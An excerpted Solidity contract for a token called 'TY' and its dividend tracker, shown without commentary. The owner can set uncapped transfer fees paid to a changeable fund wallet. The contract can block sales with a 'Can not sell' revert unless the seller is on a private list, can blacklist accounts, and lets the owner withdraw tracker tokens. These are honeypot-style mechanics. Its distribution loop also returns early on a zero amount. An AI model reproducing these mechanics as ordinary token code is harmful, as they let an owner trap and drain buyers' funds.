...
contract TY is IERC20, CommunityRole {
    ...
    uint256 private _tTotal = 388 * 10**6;
    ...
    address public fundWallet = 0x59484F94C88eA315379C14793498a0345eFee3E7;
    ...
    address lpRewardReceiveAddress_ = fundWallet;
    ...
    function allFees() public view returns (uint256,uint256) {
        return (_fundFee,_lpFee);
    }
    ...
    function setFees(uint256 Ffee,uint256 Lfee) public onlyOwnerCommunity {
        _fundFee = Ffee;
        _lpFee = Lfee;
    }
    ...
    function _transfer(
        ...
        if(to == uniswapV2Pair){
            ...
            if(_isBurning && !isAddLdx && !_digList[from]){
                revert("Can not sell");
            }
        }
        ...
        if (_isExcludedFromFee[from] || _isExcludedFromFee[to] || isAddLdx) {
            takeFee = false;
        }
    ...
    function _takeFundFee(
        ...
        _tOwned[fundWallet] = _tOwned[fundWallet].add(tAmount);
        _tFeeTotal = _tFeeTotal.add(tAmount);
        emit Transfer(sender, fundWallet, tAmount);
    }
    ...
    function _transferStandard(
        ...
        _takeFundFee(sender, tAmount.div(100).mul(_fundFee));
        _takeLPFee(sender, tAmount.div(100).mul(_lpFee));
        
        uint256 recipientRate = 100 - _fundFee - _lpFee;
        _tOwned[recipient] = _tOwned[recipient].add(tAmount.div(100).mul(recipientRate));
    ...
    function setFundAddress(address account) public onlyOwnerCommunity {
        fundWallet = account;
    }
    ...
    function setBlack(address account, bool _state) public onlyOwner {
    ...
    function addBanShare(address addr) public onlyOwner {
        dividendTracker.addBanShare(addr);
    }
    ...
    function rescueTrackerToken(address tokenAddress, uint256 tokens) public onlyOwner returns (bool success){
        return dividendTracker.rescueToken(tokenAddress,tokens,msg.sender);
    }
...
contract TokenDividendTracker is Ownable {
    ...
    function process(uint256 gas) external onlyOwner {
        ...
        uint256 totalPairCount = IERC20(uniswapV2Pair).totalSupply();
        for (uint i=0; i<banShare.length; i++) {
            totalPairCount = totalPairCount.sub(IERC20(uniswapV2Pair).balanceOf(banShare[i]));
        }
        ...
        while(gasUsed < gas && iterations < shareholderCount) {
            ...
            uint256 amount = nowbanance.mul(IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex])).div(totalPairCount);
            if( amount == 0) {
                currentIndex++;
                iterations++;
                return;
    ...
    function rescueToken(address tokenAddress, uint256 tokens, address toAddr) public onlyOwner returns (bool success){
